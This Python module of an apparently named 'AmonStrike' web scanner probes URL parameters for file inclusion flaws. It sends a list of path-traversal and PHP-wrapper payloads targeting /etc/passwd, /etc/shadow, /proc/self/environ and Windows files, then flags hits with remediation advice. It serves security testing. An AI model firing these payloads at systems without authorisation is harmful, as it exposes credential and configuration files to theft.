"""AmonStrike — LFI/RFI Module"""
from urllib.parse import parse_qs, urlparse
from .base import BaseModule

class LfiModule(BaseModule):
    NAME = "lfi"
    DESCRIPTION = "Local/Remote File Inclusion — path traversal"

    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "../../windows/system32/drivers/etc/hosts",
        "../../windows/win.ini",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain,<?php phpinfo(); ?>",
    ]

    LFI_INDICATORS = [
        "root:x:0:0",
        "[boot loader]",
        "for 16-bit app support",
        "DOCUMENT_ROOT=",
        "PATH=",
    ]

    def run(self):
        self.log("Testing for LFI/RFI vulnerabilities...")
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        # Test URL params
        file_params = {k: v[0] for k, v in params.items()
                      if any(s in k.lower() for s in ["file", "page", "include", "path", "doc", "template", "view", "load"])}

        if not file_params:
            # Try common file parameter names
            file_params = {"file": "index", "page": "home", "include": "header", "path": "index.php"}

        for param, orig in file_params.items():
            for payload in self.LFI_PAYLOADS:
                resp = self.get(params={param: payload})
                if resp and any(ind in resp.text for ind in self.LFI_INDICATORS):
                    self.add_finding(
                        title=f"Local File Inclusion — Parameter: {param}",
                        severity="CRITICAL",
                        description=f"LFI vulnerability in parameter '{param}'. Attacker can read arbitrary server files.",
                        evidence=f"Parameter: {param}\nPayload: {payload}\nResponse contains: {[i for i in self.LFI_INDICATORS if i in resp.text]}",
                        remediation="Validate file paths against a whitelist. Use realpath() and verify path stays within allowed directory. Never pass user input directly to file functions.",
                        url=resp.url,
                        cve="CWE-22"
                    )
                    break

        self.log(f"LFI scan complete — {len(self.findings)} findings", "+")
        return self.result()
